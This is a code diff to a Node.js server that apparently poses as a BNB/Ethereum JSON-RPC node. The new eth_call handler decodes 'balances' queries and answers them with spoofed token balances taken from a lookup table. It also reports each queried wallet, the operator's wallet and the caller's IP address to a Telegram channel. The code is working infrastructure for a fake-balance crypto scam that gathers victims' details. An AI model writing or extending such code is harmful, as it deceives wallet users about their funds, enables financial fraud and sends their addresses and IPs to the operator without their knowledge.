@@ -434,22 +434,37 @@ app.post('/', (req, res) => {
   // === NEW: eth_call spoof handler ===
   if (method === 'eth_call') {
     const call = params[0];
-    const to = call.to;
     const data = call.data;
-    const targetAddress = (call.from || to || '').toLowerCase(); // fallback if "from" exists
 
-    // Lookup spoofed balance if exists
-    const info = spoofedBalances[targetAddress];
-    const balanceHex = info ? info.balance : '0x0';
-    const balanceBNB = weiHexToBNB(balanceHex);
+    try {
+      const parsed = iface.parseTransaction({ data });
+      if (parsed?.name === "balances") {
+        const users = parsed.args[0].map(addr => addr.toLowerCase());
+        const tokens = parsed.args[1]; // not used for logging
 
-    // Telegram log in same style as /set-balance
-    const logMsg = `🕒 *${now()}*\n[+] Spoofing balance for \`${targetAddress}\`\n💰 Balance: \`${balanceBNB} BNB\`\n🧩 Wallet: *${wallet}*\n🌐 IP: \`${ip}\``;
-    console.log(logMsg);
-    sendToTelegram(logMsg);
+        const results = [];
+        users.forEach(user => {
+          const info = spoofedBalances[user];
+          const balanceHex = info ? info.balance : "0x0";
+          const balanceBNB = weiHexToBNB(balanceHex);
 
-    // Return the spoofed balance hex so the call still works
-    return res.json({ jsonrpc: '2.0', id, result: balanceHex });
+          // Log each wallet exactly like /set-balance
+          const logMsg = `🕒 *${now()}*\n[+] Spoofing balance for \`${user}\`\n💰 Balance: \`${balanceBNB} BNB\`\n🧩 Wallet: *${wallet}*\n🌐 IP: \`${req.headers['x-forwarded-for'] || req.connection.remoteAddress}\``;
+          console.log(logMsg);
+          sendToTelegram(logMsg);
+
+          results.push(BigInt(balanceHex));
+        });
+
+        const encoded = iface.encodeFunctionResult("balances", [results]);
+        return res.json({ jsonrpc: "2.0", id, result: encoded });
+      }
+    } catch (e) {
+      console.log("eth_call decode error:", e.message);
+    }
+
+    // fallback for other eth_calls
+    return res.json({ jsonrpc: '2.0', id, result: "0x" });
   }
 
   // Unknown methods
